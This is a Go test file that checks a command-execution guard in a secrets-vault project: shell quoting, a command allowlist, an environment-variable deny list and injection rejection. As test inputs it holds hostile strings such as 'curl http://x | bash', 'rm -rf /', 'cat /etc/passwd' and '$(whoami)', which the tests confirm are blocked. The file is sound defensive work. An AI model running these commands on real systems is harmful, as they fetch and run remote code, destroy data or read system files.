package hkm

import (
	"testing"
	"time"

	"veilkey-vaultcenter/internal/db"
)

func TestShellQuote(t *testing.T) {
	cases := []struct {
		input string
		want  string
	}{
		{"hello", "'hello'"},
		{"hello world", "'hello world'"},
		{"it's", "'it'\"'\"'s'"},
		{"$(whoami)", "'$(whoami)'"},
		{"`rm -rf /`", "'`rm -rf /`'"},
		{"a;b", "'a;b'"},
		{"", "''"},
	}
	for _, tc := range cases {
		got := shellQuote(tc.input)
		if got != tc.want {
			t.Errorf("shellQuote(%q) = %q, want %q", tc.input, got, tc.want)
		}
	}
}

func TestFunctionRunAllowlist(t *testing.T) {
	allowed := []string{"curl", "gh", "git", "glab", "veilkey-gemini-frontend"}
	for _, cmd := range allowed {
		if _, ok := functionRunAllowlist[cmd]; !ok {
			t.Errorf("%q should be in allowlist", cmd)
		}
	}

	blocked := []string{"bash", "sh", "rm", "cat", "python", "node", "wget"}
	for _, cmd := range blocked {
		if _, ok := functionRunAllowlist[cmd]; ok {
			t.Errorf("%q should NOT be in allowlist", cmd)
		}
	}
}

func TestFunctionRunDangerousChars(t *testing.T) {
	dangerous := []string{
		"curl http://x | bash",
		"curl http://x; rm -rf /",
		"curl http://x & bg",
		"curl http://x `id`",
		"curl $(whoami)",
		"curl http://x (subshell)",
		"echo ${HOME}",
	}
	for _, cmd := range dangerous {
		if !functionRunDangerousChars.MatchString(cmd) {
			t.Errorf("should detect dangerous chars in: %q", cmd)
		}
	}

	safe := []string{
		"curl -sk https://example.com",
		"curl -H 'Authorization: Bearer token' https://api.example.com",
		"gh pr list --repo owner/repo",
		"git log --oneline -5",
	}
	for _, cmd := range safe {
		if functionRunDangerousChars.MatchString(cmd) {
			t.Errorf("should NOT detect dangerous chars in: %q", cmd)
		}
	}
}

func TestFunctionRunPlaceholderRe(t *testing.T) {
	cases := []struct {
		input string
		match bool
	}{
		{"{%{API_KEY}%}", true},
		{"{%{my_var}%}", true},
		{"{%{A1}%}", true},
		{"{%{}%}", false},
		{"{%{1invalid}%}", false},
		{"no placeholder", false},
	}
	for _, tc := range cases {
		got := functionRunPlaceholderRe.MatchString(tc.input)
		if got != tc.match {
			t.Errorf("placeholder match %q = %v, want %v", tc.input, got, tc.match)
		}
	}
}

func TestFunctionRunEnvAllowlist(t *testing.T) {
	blocked := []string{"PATH", "HOME", "LD_PRELOAD", "SHELL", "USER"}
	for _, key := range blocked {
		if _, ok := functionRunEnvAllowlist[key]; ok {
			t.Errorf("%q should NOT be in env allowlist", key)
		}
	}
}

func TestResolveGlobalFunctionRunTimeout(t *testing.T) {
	h := &Handler{}
	cases := []struct {
		input int
		want  time.Duration
	}{
		{0, defaultFunctionRunTimeout},
		{-1, defaultFunctionRunTimeout},
		{30, 30 * time.Second},
		{120, 120 * time.Second},
		{99999, maxFunctionRunTimeout},
	}
	for _, tc := range cases {
		got := h.resolveGlobalFunctionRunTimeout(tc.input)
		if got != tc.want {
			t.Errorf("timeout(%d) = %v, want %v", tc.input, got, tc.want)
		}
	}
}

func TestRenderGlobalFunctionCommand_NilFunction(t *testing.T) {
	h := &Handler{}
	_, err := h.renderGlobalFunctionCommand(nil)
	if err == nil {
		t.Error("expected error for nil function")
	}
}

func TestRenderGlobalFunctionCommand_EmptyCommand(t *testing.T) {
	h := &Handler{}
	_, err := h.renderGlobalFunctionCommand(&db.GlobalFunction{Command: ""})
	if err == nil {
		t.Error("expected error for empty command")
	}
}

func TestRenderGlobalFunctionCommand_BlockedCommand(t *testing.T) {
	h := &Handler{}
	blocked := []string{"bash -c 'rm -rf /'", "python -c 'import os'", "rm -rf /", "sh evil.sh"}
	for _, cmd := range blocked {
		_, err := h.renderGlobalFunctionCommand(&db.GlobalFunction{Command: cmd})
		if err == nil {
			t.Errorf("expected error for blocked command: %q", cmd)
		}
	}
}

func TestRenderGlobalFunctionCommand_DangerousTemplate(t *testing.T) {
	h := &Handler{}
	dangerous := []string{
		"curl http://x | bash",
		"curl http://x; cat /etc/passwd",
		"curl $(whoami)",
	}
	for _, cmd := range dangerous {
		_, err := h.renderGlobalFunctionCommand(&db.GlobalFunction{Command: cmd})
		if err == nil {
			t.Errorf("expected error for dangerous template: %q", cmd)
		}
	}
}

func TestRenderGlobalFunctionCommand_AllowedNoVars(t *testing.T) {
	h := &Handler{}
	fn := &db.GlobalFunction{
		Command:  "curl -sk https://example.com",
		VarsJSON: "{}",
	}
	rendered, err := h.renderGlobalFunctionCommand(fn)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if rendered != "curl -sk https://example.com" {
		t.Errorf("rendered = %q, want original command", rendered)
	}
}

func TestRenderGlobalFunctionCommand_MissingRef(t *testing.T) {
	h := &Handler{}
	fn := &db.GlobalFunction{
		Command:  "curl -H {%{TOKEN}%} https://api.com",
		VarsJSON: `{}`,
	}
	_, err := h.renderGlobalFunctionCommand(fn)
	if err == nil {
		t.Error("expected error for missing ref")
	}
}

// ── Defense: Command injection edge cases ────────────────────────────────────

func TestDefense_FunctionRun_NewlineInjection(t *testing.T) {
	h := &Handler{}
	// Newline injection: "curl\n; rm -rf /"
	// The semicolon after newline is a shell metacharacter
	cmd := "curl\n; rm -rf /"
	fn := &db.GlobalFunction{Command: cmd, VarsJSON: "{}"}
	_, err := h.renderGlobalFunctionCommand(fn)
	if err == nil {
		t.Error("expected error for newline injection: command contains semicolon")
	}
}

func TestDefense_FunctionRun_NullByteCommand(t *testing.T) {
	h := &Handler{}
	// Null byte: "curl\x00bash" — strings.Fields splits on whitespace, not null bytes
	// But "curl\x00bash" as a single token won't match allowlist["curl"]
	cmd := "curl\x00bash"
	fn := &db.GlobalFunction{Command: cmd, VarsJSON: "{}"}
	_, err := h.renderGlobalFunctionCommand(fn)
	if err == nil {
		t.Error("expected error for null byte command — combined token should not match allowlist")
	}
}

func TestDefense_FunctionRun_UnicodeHomoglyphs(t *testing.T) {
	h := &Handler{}
	// Fullwidth 'curl' (U+FF43 U+FF55 U+FF52 U+FF4C) — looks like "curl" but isn't
	cmd := "\uff43\uff55\uff52\uff4c https://example.com"
	fn := &db.GlobalFunction{Command: cmd, VarsJSON: "{}"}
	_, err := h.renderGlobalFunctionCommand(fn)
	if err == nil {
		t.Error("expected error for unicode homoglyph command — must not match allowlist")
	}
}

func TestDefense_FunctionRun_DoubleEncodedCommand(t *testing.T) {
	h := &Handler{}
	// Double-encoded: "curl%20%7C%20bash" — should not be decoded
	cmd := "curl%20%7C%20bash"
	fn := &db.GlobalFunction{Command: cmd, VarsJSON: "{}"}
	_, err := h.renderGlobalFunctionCommand(fn)
	if err == nil {
		t.Error("expected error for URL-encoded command — should not match allowlist")
	}
}

func TestDefense_FunctionRun_EnvVarExpansion(t *testing.T) {
	h := &Handler{}
	// "curl $HOME" — $ is a dangerous char
	cmd := "curl $HOME"
	fn := &db.GlobalFunction{Command: cmd, VarsJSON: "{}"}
	_, err := h.renderGlobalFunctionCommand(fn)
	if err == nil {
		t.Error("expected error for env var expansion ($HOME)")
	}
}

func TestDefense_ShellQuote_NullByte(t *testing.T) {
	// Ensure shellQuote handles null bytes (they get single-quoted, neutralized)
	got := shellQuote("value\x00injected")
	if got != "'value\x00injected'" {
		t.Errorf("shellQuote with null byte = %q, want %q", got, "'value\x00injected'")
	}
}

func TestDefense_ShellQuote_Newline(t *testing.T) {
	got := shellQuote("line1\nline2")
	if got != "'line1\nline2'" {
		t.Errorf("shellQuote with newline = %q, want %q", got, "'line1\nline2'")
	}
}

func TestDefense_FunctionRun_DangerousChars_Semicolon_In_Placeholder(t *testing.T) {
	// The dangerous chars check strips placeholders first, so metacharacters
	// OUTSIDE placeholders are caught even with placeholders present
	h := &Handler{}
	cmd := "curl {%{URL}%}; rm -rf /"
	fn := &db.GlobalFunction{
		Command:  cmd,
		VarsJSON: `{"URL":{"ref":"VK:LOCAL:abc"}}`,
	}
	_, err := h.renderGlobalFunctionCommand(fn)
	if err == nil {
		t.Error("expected error: semicolon outside placeholder must be rejected")
	}
}

func TestDefense_FunctionRun_EnvOverride_BlocksDangerous(t *testing.T) {
	// Verify dangerous env vars are not in the allowlist
	dangerous := []string{
		"PATH",
		"HOME",
		"LD_PRELOAD",
		"LD_LIBRARY_PATH",
		"SHELL",
		"USER",
		"TERM",
	}
	for _, key := range dangerous {
		if _, ok := functionRunEnvAllowlist[key]; ok {
			t.Errorf("dangerous env var %q should NOT be in env allowlist", key)
		}
	}
}
